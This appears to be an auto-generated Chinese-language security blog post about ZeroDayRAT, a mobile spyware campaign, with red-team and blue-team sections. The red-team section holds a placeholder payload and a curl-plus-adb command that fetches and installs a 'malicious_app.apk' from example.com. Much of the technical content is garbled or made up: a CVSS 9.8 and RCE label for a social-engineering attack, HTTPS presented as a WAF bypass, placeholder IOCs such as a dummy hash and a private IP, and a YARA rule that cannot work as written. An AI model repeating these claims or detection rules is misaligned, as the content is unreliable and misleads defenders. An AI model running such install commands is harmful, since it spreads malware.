---
layout: post
title:  "New ZeroDayRAT Mobile Spyware Enables Real-Time Surveillance and Data Theft"
date:   2026-02-16 12:46:04 +0000
categories: [security]
severity: critical
---

# 🚨 解析 ZeroDayRAT 移動式間諜軟體的技術細節與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution) 與 Info Leak
> * **關鍵技術**: Social Engineering, Malware, Spyware, Surveillance

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: ZeroDayRAT 的攻擊方式主要是透過社交工程（Social Engineering）和假冒應用程式市場（Fake App Marketplaces）來分發惡意軟體。這種惡意軟體可以在 Android 5 到 16 版本和 iOS 版本上運行。
* **攻擊流程圖解**: 
  1. 使用者下載並安裝假冒應用程式。
  2. 惡意軟體要求使用者授予權限，包括存取敏感資料和控制設備。
  3. 一旦授權，惡意軟體就可以收集使用者的敏感資料，包括位置、通訊錄、短信等。
  4. 惡意軟體還可以進行實時監控，包括攝像頭和麥克風的存取。
* **受影響元件**: Android 5-16 版本、iOS 版本（具體版本號碼未提供）。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 需要使用者下載並安裝假冒應用程式，並授予惡意軟體權限。
* **Payload 建構邏輯**:

    ```
    
    python
    # 範例 Payload 結構
    payload = {
        "type": "android",
        "version": "5-16",
        "permissions": ["LOCATION", "CONTACTS", "SMS"],
        "surveillance": True,
        "stealer": True
    }
    
    ```
* **範例指令**: 使用 `curl` 下載並安裝假冒應用程式。

```

bash
curl -o malicious_app.apk https://example.com/malicious_app.apk
adb install malicious_app.apk

```
* **繞過技術**: 可以使用 WAF 繞過技巧，例如使用加密通訊協定（HTTPS）來隱藏惡意流量。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /data/data/com.example.app |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule ZeroDayRAT {
        meta:
            description = "Detects ZeroDayRAT malware"
            author = "Your Name"
        strings:
            $a = "malicious_app.apk"
        condition:
            $a at entry_point
    }
    
    ```
* **緩解措施**: 更新系統和應用程式至最新版本，使用防毒軟體和防火牆，避免下載來源不明的應用程式。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Social Engineering (社交工程)**: 惡意人員使用心理操縱的手段來欺騙使用者下載和安裝惡意軟體。
* **Malware (惡意軟體)**: 惡意軟體是指設計用來損害或破壞電腦系統的軟體。
* **Spyware (間諜軟體)**: 間諜軟體是指設計用來收集使用者敏感資料的軟體。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/02/new-zerodayrat-mobile-spyware-enables.html)
- [MITRE ATT&CK](https://attack.mitre.org/)


